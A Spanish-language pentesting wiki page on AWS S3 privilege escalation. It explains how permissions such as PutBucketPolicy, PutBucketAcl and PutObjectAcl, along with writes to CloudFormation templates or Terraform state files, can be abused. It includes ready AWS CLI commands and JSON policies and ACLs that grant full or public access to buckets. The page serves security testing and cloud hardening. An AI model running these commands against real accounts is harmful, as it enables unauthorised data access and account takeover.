# AWS - S3 Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## S3

### `s3:PutBucketNotification`, `s3:PutObject`, `s3:GetObject`

Un atacante con esos permisos sobre buckets interesantes podría secuestrar recursos y escalar privilegios.

Por ejemplo, un atacante con esos **permisos sobre un bucket de cloudformation** llamado "cf-templates-nohnwfax6a6i-us-east-1" podrá secuestrar el despliegue. El acceso puede otorgarse con la siguiente política:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": [
"s3:PutBucketNotification",
"s3:GetBucketNotification",
"s3:PutObject",
"s3:GetObject"
],
"Resource": [
"arn:aws:s3:::cf-templates-*/*",
"arn:aws:s3:::cf-templates-*"
]
},
{
"Effect": "Allow",
"Action": "s3:ListAllMyBuckets",
"Resource": "*"
}
]
}
```
Y el secuestro es posible porque existe una **pequeña ventana de tiempo desde el momento en que la plantilla se sube** al bucket hasta el momento en que la **plantilla se despliega**. Un atacante podría simplemente crear una **lambda function** en su cuenta que se **dispare cuando se envíe una notificación del bucket**, y **secuestra** el **contenido** de ese **bucket**.

![](<../../../images/image (174).png>)

El módulo de Pacu [`cfn__resouce_injection`](https://github.com/RhinoSecurityLabs/pacu/wiki/Module-Details#cfn__resource_injection) puede usarse para automatizar este ataque.\
Para más información consulta la investigación original: [https://rhinosecuritylabs.com/aws/cloud-malware-cloudformation-injection/](https://rhinosecuritylabs.com/aws/cloud-malware-cloudformation-injection/)

### `s3:PutObject`, `s3:GetObject` <a href="#s3putobject-s3getobject" id="s3putobject-s3getobject"></a>

Estas son las permisos para **obtener y subir objetos a S3**. Varios servicios dentro de AWS (y fuera de él) usan el almacenamiento S3 para guardar **archivos de configuración**.\
Un atacante con **acceso de lectura** a ellos podría encontrar **información sensible**.\
Un atacante con **acceso de escritura** podría **modificar los datos para abusar de algún servicio e intentar escalar privilegios**.\
Algunos ejemplos:

- Si una instancia EC2 está almacenando los **user data en un bucket S3**, un atacante podría modificarlos para **ejecutar código arbitrario dentro de la instancia EC2**.

### `s3:PutObject`, `s3:GetObject` (optional) over terraform state file

Es muy común que los state files de [terraform](https://cloud.hacktricks.wiki/en/pentesting-ci-cd/terraform-security.html) se guarden en el blob storage de los proveedores cloud, p. ej. AWS S3. El sufijo de archivo para un state file es `.tfstate`, y los nombres de los buckets a menudo delatan que contienen terraform state files. Normalmente, cada cuenta AWS tiene un bucket así para almacenar los state files que muestran el estado de la cuenta. Además, en cuentas del mundo real casi siempre todos los desarrolladores tienen `s3:*` y a veces incluso usuarios de negocio tienen `s3:Put*`.

Por lo tanto, si tienes los permisos listados sobre estos archivos, existe un vector de ataque que te permite obtener RCE en la pipeline con los privilegios de `terraform` —la mayoría de las veces `AdministratorAccess`—, convirtiéndote en administrador de la cuenta cloud. Además, puedes usar ese vector para realizar un ataque de denegación de servicio haciendo que `terraform` elimine recursos legítimos.

Sigue la descripción en la sección *Abusing Terraform State Files* de la página *Terraform Security* para obtener código de exploit directamente usable:

{{#ref}}
../../../../pentesting-ci-cd/terraform-security.md#abusing-terraform-state-files
{{#endref}}

### `s3:PutBucketPolicy`

Un atacante que necesite ser **de la misma cuenta** —si no, se disparará el error `The specified method is not allowed`— con este permiso podrá otorgarse más permisos sobre el/los bucket(s), permitiéndole leer, escribir, modificar, eliminar y exponer buckets.
```bash
# Update Bucket policy
aws s3api put-bucket-policy --policy file:///root/policy.json --bucket <bucket-name>

## JSON giving permissions to a user and mantaining some previous root access
{
"Id": "Policy1568185116930",
"Version":"2012-10-17",
"Statement":[
{
"Effect":"Allow",
"Principal":{
"AWS":"arn:aws:iam::123123123123:root"
},
"Action":"s3:ListBucket",
"Resource":"arn:aws:s3:::somebucketname"
},
{
"Effect":"Allow",
"Principal":{
"AWS":"arn:aws:iam::123123123123:user/username"
},
"Action":"s3:*",
"Resource":"arn:aws:s3:::somebucketname/*"
}
]
}

## JSON Public policy example
### IF THE S3 BUCKET IS PROTECTED FROM BEING PUBLICLY EXPOSED, THIS WILL THROW AN ACCESS DENIED EVEN IF YOU HAVE ENOUGH PERMISSIONS
{
"Id": "Policy1568185116930",
"Version": "2012-10-17",
"Statement": [
{
"Sid": "Stmt1568184932403",
"Action": [
"s3:ListBucket"
],
"Effect": "Allow",
"Resource": "arn:aws:s3:::welcome",
"Principal": "*"
},
{
"Sid": "Stmt1568185007451",
"Action": [
"s3:GetObject"
],
"Effect": "Allow",
"Resource": "arn:aws:s3:::welcome/*",
"Principal": "*"
}
]
}
```
### `s3:GetBucketAcl`, `s3:PutBucketAcl`

Un attacker podría abusar de estos permisos para **concederle más acceso** sobre buckets específicos.\
Ten en cuenta que el attacker no necesita ser del mismo account. Además, el write access
```bash
# Update bucket ACL
aws s3api get-bucket-acl --bucket <bucket-name>
aws s3api put-bucket-acl --bucket <bucket-name> --access-control-policy file://acl.json

##JSON ACL example
## Make sure to modify the Owner’s displayName and ID according to the Object ACL you retrieved.
{
"Owner": {
"DisplayName": "<DisplayName>",
"ID": "<ID>"
},
"Grants": [
{
"Grantee": {
"Type": "Group",
"URI": "http://acs.amazonaws.com/groups/global/AuthenticatedUsers"
},
"Permission": "FULL_CONTROL"
}
]
}
## An ACL should give you the permission WRITE_ACP to be able to put a new ACL
```
### `s3:GetObjectAcl`, `s3:PutObjectAcl`

Un attacker podría abusar de estos permisos para otorgarse mayor acceso a objetos específicos dentro de los buckets.
```bash
# Update bucket object ACL
aws s3api get-object-acl --bucket <bucekt-name> --key flag
aws s3api put-object-acl --bucket <bucket-name> --key flag --access-control-policy file://objacl.json

##JSON ACL example
## Make sure to modify the Owner’s displayName and ID according to the Object ACL you retrieved.
{
"Owner": {
"DisplayName": "<DisplayName>",
"ID": "<ID>"
},
"Grants": [
{
"Grantee": {
"Type": "Group",
"URI": "http://acs.amazonaws.com/groups/global/AuthenticatedUsers"
},
"Permission": "FULL_CONTROL"
}
]
}
## An ACL should give you the permission WRITE_ACP to be able to put a new ACL
```
### `s3:GetObjectAcl`, `s3:PutObjectVersionAcl`

Un atacante con estos privilegios debería poder asignar un Acl a una versión específica del objeto
```bash
aws s3api get-object-acl --bucket <bucekt-name> --key flag
aws s3api put-object-acl --bucket <bucket-name> --key flag --version-id <value> --access-control-policy file://objacl.json
```
{{#include ../../../../banners/hacktricks-training.md}}
